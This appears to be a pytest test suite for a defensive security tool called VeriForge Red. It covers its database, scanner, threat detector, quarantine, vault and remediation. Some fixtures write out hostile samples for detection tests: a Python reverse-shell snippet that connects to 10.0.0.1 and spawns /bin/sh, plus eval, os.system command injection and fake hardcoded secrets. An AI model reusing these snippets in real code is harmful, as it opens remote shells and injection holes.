"""Comprehensive tests for VeriForge Red core engine.

Covers:
- Database CRUD operations for all 6 tables
- Scanner initialization and scan flow
- Privacy auditor base class and platform subclasses
- Threat detector pattern matching
- Quarantine encrypt/decrypt/restore cycle
- Vault store/retrieve/delete cycle
- Remediation strategies
- Monitor start/stop lifecycle
- RedEngine dashboard
"""

from __future__ import annotations

import os
import sys
import tempfile
import time
from pathlib import Path

import pytest

# Ensure the package is importable
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from veriforge_red.core.database import (
    Database,
    ScanRecord,
    ThreatRecord,
    QuarantineRecord,
    PrivacyIssueRecord,
    VaultItemRecord,
    RemediationLogRecord,
)
from veriforge_red.core.scanner import Scanner
from veriforge_red.core.privacy import (
    PrivacyAuditor,
    WindowsPrivacyAuditor,
    AndroidPrivacyAuditor,
    PrivacyIssue,
)
from veriforge_red.core.threat_detector import ThreatDetector, Threat
from veriforge_red.core.quarantine import QuarantineManager
from veriforge_red.core.vault import Vault
from veriforge_red.core.remediation import RemediationEngine
from veriforge_red.core.monitor import Monitor
from veriforge_red.core.engine import RedEngine


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def tmp_db(tmp_path: Path) -> Database:
    """Provide a fresh temporary database."""
    db_path = str(tmp_path / "test.db")
    db = Database(db_path=db_path)
    yield db
    db.close()


@pytest.fixture
def tmp_quarantine(tmp_db: Database, tmp_path: Path) -> QuarantineManager:
    """Provide a quarantine manager with temp directory."""
    qdir = str(tmp_path / "quarantine")
    return QuarantineManager(tmp_db, quarantine_dir=qdir)


@pytest.fixture
def tmp_vault(tmp_db: Database, tmp_path: Path) -> Vault:
    """Provide a vault with temp directory."""
    vdir = str(tmp_path / "vault")
    return Vault(vault_dir=vdir, db=tmp_db)


@pytest.fixture
def sample_python_file(tmp_path: Path) -> str:
    """Create a sample Python file with some detectable patterns."""
    fpath = tmp_path / "sample.py"
    fpath.write_text("""
import os

def greet(name):
    # Dangerous use of eval
    result = eval("name.upper()")
    return result

def process(data):
    # Hardcoded API key
    API_KEY = "sk-1234567890abcdef1234567890abcdef"
    os.system("echo " + data)
    return data
""")
    return str(fpath)


# ============================================================================
# 1. Database CRUD Tests
# ============================================================================

class TestDatabaseCRUD:
    """Test all CRUD operations for the six database tables."""

    # -- scans ------------------------------------------------------------

    def test_insert_and_get_scan(self, tmp_db: Database) -> None:
        sid = tmp_db.insert_scan(
            target="/tmp/test.py", grade="B", risk_score=3.5,
            findings=[{"title": "test finding"}],
        )
        assert sid > 0
        record = tmp_db.get_scan(sid)
        assert record is not None
        assert record.target == "/tmp/test.py"
        assert record.grade == "B"
        assert record.risk_score == 3.5
        assert len(record.findings) == 1

    def test_get_all_scans(self, tmp_db: Database) -> None:
        for i in range(3):
            tmp_db.insert_scan(f"/tmp/test{i}.py", "A", 1.0, [])
        scans = tmp_db.get_all_scans(limit=10)
        assert len(scans) == 3

    def test_delete_scan(self, tmp_db: Database) -> None:
        sid = tmp_db.insert_scan("/tmp/del.py", "C", 5.0, [])
        assert tmp_db.delete_scan(sid)
        assert tmp_db.get_scan(sid) is None

    # -- threats ----------------------------------------------------------

    def test_insert_and_get_threat(self, tmp_db: Database) -> None:
        tid = tmp_db.insert_threat(
            file_path="/tmp/mal.py", threat_type="reverse_shell",
            severity="critical", status="active",
        )
        assert tid > 0
        record = tmp_db.get_threat(tid)
        assert record is not None
        assert record.file_path == "/tmp/mal.py"
        assert record.threat_type == "reverse_shell"
        assert record.severity == "critical"

    def test_update_threat_status(self, tmp_db: Database) -> None:
        tid = tmp_db.insert_threat("/tmp/t.py", "test", "medium", "active")
        assert tmp_db.update_threat_status(tid, "resolved")
        record = tmp_db.get_threat(tid)
        assert record is not None
        assert record.status == "resolved"

    def test_delete_threat(self, tmp_db: Database) -> None:
        tid = tmp_db.insert_threat("/tmp/d.py", "test", "low")
        assert tmp_db.delete_threat(tid)
        assert tmp_db.get_threat(tid) is None

    def test_get_threat_count(self, tmp_db: Database) -> None:
        tmp_db.insert_threat("/tmp/a.py", "t1", "high", "active")
        tmp_db.insert_threat("/tmp/b.py", "t2", "high", "resolved")
        assert tmp_db.get_threat_count() == 1  # only active

    # -- quarantine -------------------------------------------------------

    def test_insert_and_get_quarantine(self, tmp_db: Database) -> None:
        qid = "test-qid-123"
        tmp_db.insert_quarantine(qid, "/tmp/orig.py", "/tmp/quar.py", "secretkey")
        record = tmp_db.get_quarantine(qid)
        assert record is not None
        assert record.quarantine_id == qid
        assert record.original_path == "/tmp/orig.py"
        assert not record.restored

    def test_mark_restored(self, tmp_db: Database) -> None:
        qid = "test-qid-456"
        tmp_db.insert_quarantine(qid, "/tmp/o.py", "/tmp/q.py", "key")
        assert tmp_db.mark_restored(qid)
        record = tmp_db.get_quarantine(qid)
        assert record is not None
        assert record.restored

    def test_delete_quarantine(self, tmp_db: Database) -> None:
        qid = "test-qid-789"
        tmp_db.insert_quarantine(qid, "/tmp/x.py", "/tmp/y.py", "key")
        assert tmp_db.delete_quarantine(qid)
        assert tmp_db.get_quarantine(qid) is None

    # -- privacy_issues ---------------------------------------------------

    def test_insert_and_get_privacy_issue(self, tmp_db: Database) -> None:
        pid = tmp_db.insert_privacy_issue(
            category="telemetry", setting_name="WinTel",
            current_value="1", recommended_value="0",
            severity="medium", description="Test issue", cwe_id="CWE-359",
        )
        assert pid > 0
        record = tmp_db.get_privacy_issue(pid)
        assert record is not None
        assert record.category == "telemetry"
        assert record.cwe_id == "CWE-359"

    def test_get_all_privacy_issues(self, tmp_db: Database) -> None:
        for i in range(3):
            tmp_db.insert_privacy_issue(f"cat{i}", f"set{i}", "1", "0", "low")
        issues = tmp_db.get_all_privacy_issues()
        assert len(issues) == 3

    # -- vault_items ------------------------------------------------------

    def test_insert_and_get_vault_item(self, tmp_db: Database) -> None:
        vid = "vault-test-123"
        tmp_db.insert_vault_item(vid, "/tmp/secret.txt", "/tmp/enc.txt")
        record = tmp_db.get_vault_item(vid)
        assert record is not None
        assert record.vault_id == vid
        assert record.original_path == "/tmp/secret.txt"

    def test_delete_vault_item(self, tmp_db: Database) -> None:
        vid = "vault-del-456"
        tmp_db.insert_vault_item(vid, "/tmp/a.txt", "/tmp/b.txt")
        assert tmp_db.delete_vault_item(vid)
        assert tmp_db.get_vault_item(vid) is None

    # -- remediation_log --------------------------------------------------

    def test_insert_and_get_remediation(self, tmp_db: Database) -> None:
        rid = tmp_db.insert_remediation(
            issue_type="file_permissions", file_path="/tmp/x.py",
            action_taken="chmod 600", success=True,
        )
        assert rid > 0
        record = tmp_db.get_remediation(rid)
        assert record is not None
        assert record.issue_type == "file_permissions"
        assert record.success

    def test_get_all_remediations(self, tmp_db: Database) -> None:
        for i in range(3):
            tmp_db.insert_remediation("test", f"/tmp/{i}.py", "fixed", True)
        logs = tmp_db.get_all_remediations()
        assert len(logs) == 3

    # -- stats helpers ----------------------------------------------------

    def test_get_last_scan_time(self, tmp_db: Database) -> None:
        assert tmp_db.get_last_scan_time() is None
        tmp_db.insert_scan("/tmp/t.py", "A", 0.5, [])
        assert tmp_db.get_last_scan_time() is not None

    def test_get_scan_count_last_7d(self, tmp_db: Database) -> None:
        tmp_db.insert_scan("/tmp/t.py", "A", 0.5, [])
        assert tmp_db.get_scan_count_last_7d() == 1


# ============================================================================
# 2. Scanner Tests
# ============================================================================

class TestScanner:
    """Test Scanner initialization, scan flow, and history."""

    def test_scanner_init(self, tmp_db: Database) -> None:
        scanner = Scanner(tmp_db)
        assert scanner.db is tmp_db
        scanner.stop_watching()

    def test_scan_target_missing(self, tmp_db: Database) -> None:
        scanner = Scanner(tmp_db)
        result = scanner.scan_target("/nonexistent/path")
        assert "error" in result
        scanner.stop_watching()

    def test_scan_target_file(self, tmp_db: Database, sample_python_file: str) -> None:
        scanner = Scanner(tmp_db)
        result = scanner.scan_target(sample_python_file)
        assert "target" in result
        assert result["target"] == sample_python_file
        scanner.stop_watching()

    def test_quick_scan(self, tmp_db: Database, sample_python_file: str) -> None:
        scanner = Scanner(tmp_db)
        result = scanner.quick_scan(sample_python_file)
        assert result["scan_type"] == "quick"
        scanner.stop_watching()

    def test_deep_scan(self, tmp_db: Database, sample_python_file: str) -> None:
        scanner = Scanner(tmp_db)
        result = scanner.deep_scan(sample_python_file)
        assert result["scan_type"] == "deep"
        scanner.stop_watching()

    def test_get_scan_history(self, tmp_db: Database, sample_python_file: str) -> None:
        scanner = Scanner(tmp_db)
        scanner.scan_target(sample_python_file)
        history = scanner.get_scan_history()
        assert len(history) >= 1
        scanner.stop_watching()

    def test_schedule_and_cancel_scan(self, tmp_db: Database) -> None:
        scanner = Scanner(tmp_db)
        scanner.schedule_scan("/tmp", interval_hours=168)  # weekly
        assert "/tmp" in scanner._scheduled_jobs
        scanner.cancel_scheduled_scan("/tmp")
        assert "/tmp" not in scanner._scheduled_jobs
        scanner.stop_watching()


# ============================================================================
# 3. Privacy Auditor Tests
# ============================================================================

class TestPrivacyAuditor:
    """Test PrivacyAuditor base class and subclasses."""

    def test_privacy_issue_dataclass(self) -> None:
        issue = PrivacyIssue(
            category="telemetry",
            setting_name="WinTel",
            current_value="1",
            recommended_value="0",
            severity="medium",
            description="Test",
            cwe_id="CWE-359",
        )
        assert issue.category == "telemetry"
        assert issue.to_dict()["cwe_id"] == "CWE-359"

    def test_base_audit_privacy_no_issues(self, tmp_db: Database, tmp_path: Path) -> None:
        """With a clean temp directory, audit should find minimal issues."""
        os.chdir(tmp_path)
        auditor = WindowsPrivacyAuditor(tmp_db)
        issues = auditor.audit_privacy()
        # Should return a list (might be empty on non-Windows)
        assert isinstance(issues, list)

    def test_get_privacy_score(self, tmp_db: Database, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        auditor = WindowsPrivacyAuditor(tmp_db)
        score = auditor.get_privacy_score()
        assert 0.0 <= score <= 100.0

    def test_recommend_fixes(self, tmp_db: Database, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        auditor = WindowsPrivacyAuditor(tmp_db)
        fixes = auditor.recommend_fixes()
        assert isinstance(fixes, list)

    def test_windows_subclass_init(self, tmp_db: Database) -> None:
        auditor = WindowsPrivacyAuditor(tmp_db)
        assert auditor is not None

    def test_android_subclass_init(self, tmp_db: Database) -> None:
        auditor = AndroidPrivacyAuditor(tmp_db)
        assert auditor is not None

    def test_hardcoded_credentials_detection(self, tmp_db: Database, tmp_path: Path) -> None:
        """Write a Python file with hardcoded password and verify detection."""
        os.chdir(tmp_path)
        fpath = tmp_path / "bad_code.py"
        fpath.write_text("PASSWORD = 'supersecret123'\n")
        auditor = WindowsPrivacyAuditor(tmp_db)
        issues = auditor._check_hardcoded_credentials()
        assert any("password" in i.setting_name.lower() for i in issues)

    def test_exposed_secrets_detection(self, tmp_db: Database, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        env_file = tmp_path / ".env"
        env_file.write_text("API_KEY='sk-1234567890abcdef'\n")
        auditor = WindowsPrivacyAuditor(tmp_db)
        issues = auditor._check_exposed_secrets()
        assert any("secret_in_" in i.setting_name.lower() for i in issues)


# ============================================================================
# 4. Threat Detector Tests
# ============================================================================

class TestThreatDetector:
    """Test ThreatDetector pattern matching across all 7 categories."""

    def test_threat_dataclass(self) -> None:
        t = Threat(
            id="T-001", file_path="/tmp/x.py", threat_type="eval",
            severity="high", confidence=0.9, evidence="eval()",
            recommendation="Remove eval",
        )
        assert t.to_dict()["severity"] == "high"

    def test_scan_file_dangerous_builtin(self, tmp_db: Database, tmp_path: Path) -> None:
        fpath = tmp_path / "eval_test.py"
        fpath.write_text("result = eval(user_input)\n")
        detector = ThreatDetector(tmp_db)
        threats = detector.scan_file(str(fpath))
        assert any(t.threat_type == "dangerous_builtin" for t in threats)

    def test_scan_file_hardcoded_password(self, tmp_db: Database, tmp_path: Path) -> None:
        fpath = tmp_path / "password_test.py"
        fpath.write_text("password = 'mysecretpassword123'\n")
        detector = ThreatDetector(tmp_db)
        threats = detector.scan_file(str(fpath))
        assert any("password" in t.threat_type for t in threats)

    def test_scan_file_hardcoded_api_key(self, tmp_db: Database, tmp_path: Path) -> None:
        fpath = tmp_path / "apikey_test.py"
        fpath.write_text("api_key = 'sk-abc1234567890abcdef'\n")
        detector = ThreatDetector(tmp_db)
        threats = detector.scan_file(str(fpath))
        assert any("api_key" in t.threat_type for t in threats)

    def test_scan_file_base64_obfuscation(self, tmp_db: Database, tmp_path: Path) -> None:
        fpath = tmp_path / "obf_test.py"
        fpath.write_text(
            "import base64\n"
            "data = base64.b64decode('SGVsbG8gV29ybGQgV2l0aCBFeHRyYSBEYXRhIEZvciBUZXN0aW5n')\n"
        )
        detector = ThreatDetector(tmp_db)
        threats = detector.scan_file(str(fpath))
        assert any(t.threat_type == "base64_obfuscation" for t in threats)

    def test_scan_file_reverse_shell(self, tmp_db: Database, tmp_path: Path) -> None:
        fpath = tmp_path / "shell_test.py"
        fpath.write_text(
            "import socket, subprocess\n"
            "s = socket.socket()\n"
            "s.connect(('10.0.0.1', 9999))\n"
            "subprocess.Popen(['/bin/sh'], stdin=s)\n"
        )
        detector = ThreatDetector(tmp_db)
        threats = detector.scan_file(str(fpath))
        assert any(t.threat_type == "reverse_shell" for t in threats)

    def test_scan_file_credential_file(self, tmp_db: Database, tmp_path: Path) -> None:
        env_file = tmp_path / ".env"
        env_file.write_text("DATABASE_PASSWORD='supersecret123'\n")
        detector = ThreatDetector(tmp_db)
        threats = detector.scan_file(str(env_file))
        assert any(t.threat_type == "credential_file_exposed" for t in threats)

    def test_scan_directory(self, tmp_db: Database, tmp_path: Path) -> None:
        (tmp_path / "a.py").write_text("eval('1+1')\n")
        (tmp_path / "b.py").write_text("password = 'secret'\n")
        detector = ThreatDetector(tmp_db)
        threats = detector.scan_directory(str(tmp_path))
        assert len(threats) >= 2

    def test_check_persistence_mechanisms(self, tmp_db: Database) -> None:
        detector = ThreatDetector(tmp_db)
        threats = detector.check_persistence_mechanisms()
        assert isinstance(threats, list)

    def test_is_private_ip(self) -> None:
        assert ThreatDetector._is_private_ip("10.0.0.1")
        assert ThreatDetector._is_private_ip("192.168.1.1")
        assert ThreatDetector._is_private_ip("172.16.0.1")
        assert ThreatDetector._is_private_ip("127.0.0.1")
        assert not ThreatDetector._is_private_ip("8.8.8.8")
        assert not ThreatDetector._is_private_ip("1.2.3.4")


# ============================================================================
# 5. Quarantine Tests
# ============================================================================

class TestQuarantine:
    """Test quarantine encrypt/decrypt/restore cycle."""

    def test_quarantine_file(self, tmp_db: Database, tmp_quarantine: QuarantineManager,
                             tmp_path: Path) -> None:
        fpath = tmp_path / "malicious.py"
        fpath.write_text("# evil code\n")
        qid = tmp_quarantine.quarantine(str(fpath))
        assert qid
        # Original should be locked (no read access)
        info = tmp_quarantine.get_quarantine_info(qid)
        assert info["quarantine_id"] == qid

    def test_restore_file(self, tmp_db: Database, tmp_quarantine: QuarantineManager,
                          tmp_path: Path) -> None:
        fpath = tmp_path / "restore_me.py"
        original_content = "# legitimate code\n"
        fpath.write_text(original_content)
        qid = tmp_quarantine.quarantine(str(fpath))
        restored_path = tmp_quarantine.restore(qid)
        assert Path(restored_path).exists()
        assert Path(restored_path).read_text() == original_content

    def test_delete_permanently(self, tmp_db: Database, tmp_quarantine: QuarantineManager,
                                tmp_path: Path) -> None:
        fpath = tmp_path / "delete_me.py"
        fpath.write_text("# delete me\n")
        qid = tmp_quarantine.quarantine(str(fpath))
        assert tmp_quarantine.delete_permanently(qid)
        # Should be gone from DB
        info = tmp_quarantine.get_quarantine_info(qid)
        assert "error" in info

    def test_list_quarantined(self, tmp_db: Database, tmp_quarantine: QuarantineManager,
                              tmp_path: Path) -> None:
        fpath = tmp_path / "listed.py"
        fpath.write_text("# listed\n")
        tmp_quarantine.quarantine(str(fpath))
        items = tmp_quarantine.list_quarantined()
        assert isinstance(items, list)
        assert len(items) >= 1

    def test_decrypt_preview(self, tmp_db: Database, tmp_quarantine: QuarantineManager,
                             tmp_path: Path) -> None:
        fpath = tmp_path / "preview.py"
        fpath.write_text("# preview content\n")
        qid = tmp_quarantine.quarantine(str(fpath))
        preview = tmp_quarantine.decrypt_preview(qid)
        assert b"preview content" in preview


# ============================================================================
# 6. Vault Tests
# ============================================================================

class TestVault:
    """Test vault store/retrieve/delete cycle."""

    def test_store_and_retrieve(self, tmp_vault: Vault, tmp_path: Path) -> None:
        fpath = tmp_path / "secret.txt"
        fpath.write_text("top secret data")
        vid = tmp_vault.store(str(fpath), password="mypassword")
        assert vid

        outpath = tmp_path / "retrieved.txt"
        result = tmp_vault.retrieve(vid, str(outpath), password="mypassword")
        assert Path(result).read_text() == "top secret data"

    def test_list_items(self, tmp_vault: Vault, tmp_path: Path) -> None:
        fpath = tmp_path / "list_test.txt"
        fpath.write_text("data")
        tmp_vault.store(str(fpath), password="pw")
        items = tmp_vault.list_items()
        assert len(items) >= 1

    def test_delete(self, tmp_vault: Vault, tmp_path: Path) -> None:
        fpath = tmp_path / "del_vault.txt"
        fpath.write_text("delete me")
        vid = tmp_vault.store(str(fpath), password="pw")
        assert tmp_vault.delete(vid)
        items = tmp_vault.list_items()
        assert not any(i["vault_id"] == vid for i in items)

    def test_change_password(self, tmp_vault: Vault, tmp_path: Path) -> None:
        fpath = tmp_path / "pw_change.txt"
        fpath.write_text("password change test")
        vid = tmp_vault.store(str(fpath), password="oldpassword")
        assert tmp_vault.change_password(vid, "oldpassword", "newpassword")

        outpath = tmp_path / "retrieved2.txt"
        result = tmp_vault.retrieve(vid, str(outpath), password="newpassword")
        assert Path(result).read_text() == "password change test"

    def test_wrong_password_fails(self, tmp_vault: Vault, tmp_path: Path) -> None:
        fpath = tmp_path / "wrong_pw.txt"
        fpath.write_text("data")
        vid = tmp_vault.store(str(fpath), password="correct")
        outpath = tmp_path / "should_fail.txt"
        with pytest.raises(Exception):
            tmp_vault.retrieve(vid, str(outpath), password="wrong")

    def test_change_password_wrong_old(self, tmp_vault: Vault, tmp_path: Path) -> None:
        fpath = tmp_path / "wrong_old.txt"
        fpath.write_text("data")
        vid = tmp_vault.store(str(fpath), password="original")
        result = tmp_vault.change_password(vid, "wrong", "new")
        assert not result


# ============================================================================
# 7. Remediation Tests
# ============================================================================

class TestRemediation:
    """Test remediation strategies."""

    def test_fix_file_permissions(self, tmp_db: Database, tmp_quarantine: QuarantineManager,
                                  tmp_path: Path) -> None:
        fpath = tmp_path / "perms.txt"
        fpath.write_text("data")
        os.chmod(fpath, 0o777)
        engine = RemediationEngine(tmp_db, tmp_quarantine)
        success = engine._fix_file_permissions(str(fpath))
        assert success
        mode = fpath.stat().st_mode
        assert not (mode & 0o077)  # no group/other perms

    def test_replace_eval(self, tmp_db: Database, tmp_quarantine: QuarantineManager) -> None:
        engine = RemediationEngine(tmp_db, tmp_quarantine)
        code = "result = eval('1+1')\n"
        fixed = engine._replace_eval_with_literal(code)
        assert "ast.literal_eval" in fixed
        assert "import ast" in fixed

    def test_add_type_hints(self, tmp_db: Database, tmp_quarantine: QuarantineManager) -> None:
        engine = RemediationEngine(tmp_db, tmp_quarantine)
        code = "def foo(x):\n    pass\n"
        fixed = engine._add_type_hints(code)
        assert "from __future__ import annotations" in fixed

    def test_auto_remediate_all(self, tmp_db: Database, tmp_quarantine: QuarantineManager) -> None:
        engine = RemediationEngine(tmp_db, tmp_quarantine)
        scan_result = {
            "findings": [
                {"file": "/tmp/nonexistent.py", "category": "eval", "title": "eval usage"},
            ]
        }
        result = engine.auto_remediate_all(scan_result)
        assert "total" in result
        assert result["total"] == 1

    def test_get_remediation_history(self, tmp_db: Database, tmp_quarantine: QuarantineManager) -> None:
        engine = RemediationEngine(tmp_db, tmp_quarantine)
        tmp_db.insert_remediation("test", "/tmp/x.py", "action", True)
        history = engine.get_remediation_history()
        assert len(history) >= 1


# ============================================================================
# 8. Monitor Tests
# ============================================================================

class TestMonitor:
    """Test Monitor start/stop lifecycle."""

    def test_monitor_init(self, tmp_db: Database, tmp_quarantine: QuarantineManager,
                          tmp_path: Path) -> None:
        os.chdir(tmp_path)
        scanner = Scanner(tmp_db)
        privacy = WindowsPrivacyAuditor(tmp_db)
        detector = ThreatDetector(tmp_db)
        remediation = RemediationEngine(tmp_db, tmp_quarantine)
        monitor = Monitor(
            scanner, privacy, detector, tmp_quarantine, remediation, tmp_db,
            intervals={"privacy": 1, "threat": 1, "scheduled_scan": 1},
        )
        assert not monitor.is_running()
        scanner.stop_watching()

    def test_monitor_start_stop(self, tmp_db: Database, tmp_quarantine: QuarantineManager,
                                tmp_path: Path) -> None:
        os.chdir(tmp_path)
        scanner = Scanner(tmp_db)
        privacy = WindowsPrivacyAuditor(tmp_db)
        detector = ThreatDetector(tmp_db)
        remediation = RemediationEngine(tmp_db, tmp_quarantine)
        monitor = Monitor(
            scanner, privacy, detector, tmp_quarantine, remediation, tmp_db,
            intervals={"privacy": 3600, "threat": 3600, "scheduled_scan": 3600},
        )
        monitor.start()
        assert monitor.is_running()
        time.sleep(0.5)  # let threads start
        status = monitor.get_status()
        assert status["started_at"] is not None
        monitor.stop()
        assert not monitor.is_running()
        scanner.stop_watching()


# ============================================================================
# 9. RedEngine Tests
# ============================================================================

class TestRedEngine:
    """Test RedEngine dashboard and coordinator functions."""

    def test_engine_init(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        engine = RedEngine(config={"db_path": str(tmp_path / "red.db")})
        assert engine.db is not None
        assert engine.scanner is not None
        assert engine.privacy is not None
        assert engine.threat_detector is not None
        assert engine.quarantine is not None
        assert engine.remediation is not None
        assert engine.vault is not None
        assert engine.monitor is not None

    def test_get_security_score(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        engine = RedEngine(config={"db_path": str(tmp_path / "red2.db")})
        score = engine.get_security_score()
        assert 0.0 <= score <= 100.0

    def test_get_privacy_score(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        engine = RedEngine(config={"db_path": str(tmp_path / "red3.db")})
        score = engine.get_privacy_score()
        assert 0.0 <= score <= 100.0

    def test_get_overall_score(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        engine = RedEngine(config={"db_path": str(tmp_path / "red4.db")})
        score = engine.get_overall_score()
        assert 0.0 <= score <= 100.0

    def test_dashboard(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        engine = RedEngine(config={"db_path": str(tmp_path / "red5.db")})
        # Insert some data
        engine.db.insert_scan("/tmp/test.py", "B", 3.0, [])
        engine.db.insert_threat("/tmp/t.py", "test", "medium", "active")
        engine.db.insert_privacy_issue("cat", "set", "1", "0", "low")
        dashboard = engine.get_dashboard()
        assert "overall_score" in dashboard
        assert "security_score" in dashboard
        assert "privacy_score" in dashboard
        assert "active_threats_count" in dashboard
        assert "quarantined_count" in dashboard
        assert "last_scan_time" in dashboard
        assert "scan_history_chart_data" in dashboard
        assert "recent_findings" in dashboard
        assert "privacy_issues" in dashboard
        assert "monitor_status" in dashboard

    def test_start_stop_monitoring(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        engine = RedEngine(config={"db_path": str(tmp_path / "red6.db")})
        engine.start_monitoring()
        assert engine.monitor.is_running()
        time.sleep(0.3)
        engine.stop_monitoring()
        assert not engine.monitor.is_running()

    def test_store_in_vault(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        engine = RedEngine(config={
            "db_path": str(tmp_path / "red7.db"),
            "vault_dir": str(tmp_path / "vault"),
        })
        fpath = tmp_path / "vault_test.txt"
        fpath.write_text("vault data")
        vid = engine.store_in_vault(str(fpath), password="testpass")
        assert vid
        items = engine.vault.list_items()
        assert any(i["vault_id"] == vid for i in items)

    def test_quarantine_and_restore(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        engine = RedEngine(config={
            "db_path": str(tmp_path / "red8.db"),
            "quarantine_dir": str(tmp_path / "quarantine"),
        })
        fpath = tmp_path / "threat.py"
        fpath.write_text("# suspicious\n")
        qid = engine.quarantine.quarantine(str(fpath))
        assert qid
        restored = engine.restore_from_quarantine(qid)
        assert restored

    def test_full_system_scan(self, tmp_path: Path) -> None:
        os.chdir(tmp_path)
        # Create a clean Python file
        fpath = tmp_path / "clean.py"
        fpath.write_text("def hello():\n    return 'hi'\n")
        engine = RedEngine(config={
            "db_path": str(tmp_path / "red9.db"),
            "scan_target": str(tmp_path),
        })
        result = engine.full_system_scan()
        assert "overall_score" in result
        assert "grade" in result
        assert "privacy_issue_count" in result
        assert "threat_count" in result
